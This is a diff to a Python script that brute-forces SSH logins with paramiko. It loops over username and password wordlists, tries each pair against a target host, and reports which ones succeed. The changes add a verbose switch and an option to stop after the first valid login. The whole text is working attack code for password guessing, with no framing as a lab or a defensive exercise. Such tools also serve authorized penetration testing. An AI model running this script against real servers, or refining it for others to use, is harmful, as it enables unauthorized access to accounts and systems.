@@ -2,8 +2,7 @@ import os
 import argparse
 import paramiko
 
-def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
-    print(f"user: {user}, password: {password}, userfile: {userfile}, passfile: {passfile}")
+def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None, verbose=False, stop_on_success=False):
     try:
         if passfile and user:
             with open(passfile, 'r') as f:
@@ -15,10 +14,11 @@ def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
                 try:
                     ssh.connect(host, port, user, password)
                     print(f'\033[92m [+]\033[0m {user} : {password}')
-                    break
-
+                    if stop_on_success:
+                        return
                 except paramiko.AuthenticationException:
-                    print(f'\033[91m [-]\033[0m {user} : {password}')
+                    if verbose:
+                        print(f'\033[91m [-]\033[0m {user} : {password}')
 
         elif userfile and password:
             with open(userfile, 'r') as f:
@@ -30,10 +30,11 @@ def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
                 try:
                     ssh.connect(host, port, user, password)
                     print(f'\033[92m [+]\033[0m {user} : {password}')
-                    break
-
+                    if stop_on_success:
+                        return
                 except paramiko.AuthenticationException:
-                    print(f'\033[91m [-]\033[0m {user} : {password}')
+                    if verbose:
+                        print(f'\033[91m [-]\033[0m {user} : {password}')
 
         elif userfile and passfile:
             with open(userfile, 'r') as f:
@@ -49,10 +50,11 @@ def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
                     try:
                         ssh.connect(host, port, user, password)
                         print(f'\033[92m [+]\033[0m {user} : {password}')
-                        return  # Exit after a successful login
-
+                        if stop_on_success:
+                            return
                     except paramiko.AuthenticationException:
-                        print(f'\033[91m [-]\033[0m {user} : {password}')
+                        if verbose:
+                            print(f'\033[91m [-]\033[0m {user} : {password}')
 
         else:
             print('\033[91m [-]\033[0m Please provide both username and password files')
